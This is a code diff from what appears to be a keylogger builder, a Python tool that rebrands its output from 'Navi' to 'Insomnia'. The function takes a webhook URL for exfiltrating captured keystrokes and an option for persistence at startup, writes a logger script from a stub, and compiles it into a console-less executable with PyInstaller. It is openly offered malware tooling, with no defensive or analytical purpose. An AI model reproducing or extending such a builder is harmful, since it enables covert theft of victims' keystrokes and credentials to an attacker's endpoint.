@@ -23,14 +23,14 @@ def build_keylogger():
     except:
         print(Colorate.Horizontal(cl["num"], "  [!] Error reading stub."))
         return
-    print(Colorate.Horizontal(cl["head"], "  [ NAVI KEYLOGGER BUILDER ]\n"))
+    print(Colorate.Horizontal(cl["head"], "  [ INSOMNIA KEYLOGGER BUILDER ]\n"))
     hook = get_inpt("webhook url:")
     if not hook: return
     startup = get_inpt("add to startup? (y/n):").lower() == 'y'
     stub = stub.replace("{{WEBHOOK}}", hook)
     stub = stub.replace("{{STARTUP}}", "True" if startup else "False")
     if not os.path.exists('output'): os.mkdir('output')
-    out_name = "Navi_Logger.py"
+    out_name = "Insomnia_Logger.py"
     out_path = os.path.join('output', out_name)
     
     with open(out_path, 'w', encoding='utf-8') as f:
@@ -39,8 +39,8 @@ def build_keylogger():
     if get_inpt("compile to exe? (y/n):").lower() == 'y':
         print(Colorate.Horizontal(cl["num"], "  [!] Compiling with PyInstaller..."))
         try:
-            subprocess.run(f"pyinstaller --onefile --noconsole --distpath ./output --name Navi_Logger {out_path}", shell=True)
-            print(Colorate.Horizontal(cl["head"], "  [+] Compiled: output/Navi_Logger.exe"))
+            subprocess.run(f"pyinstaller --onefile --noconsole --distpath ./output --name Insomnia_Logger {out_path}", shell=True)
+            print(Colorate.Horizontal(cl["head"], "  [+] Compiled: output/Insomnia_Logger.exe"))
         except Exception as e:
             print(Colorate.Horizontal(cl["num"], f"  [!] Build Error: {e}"))
 
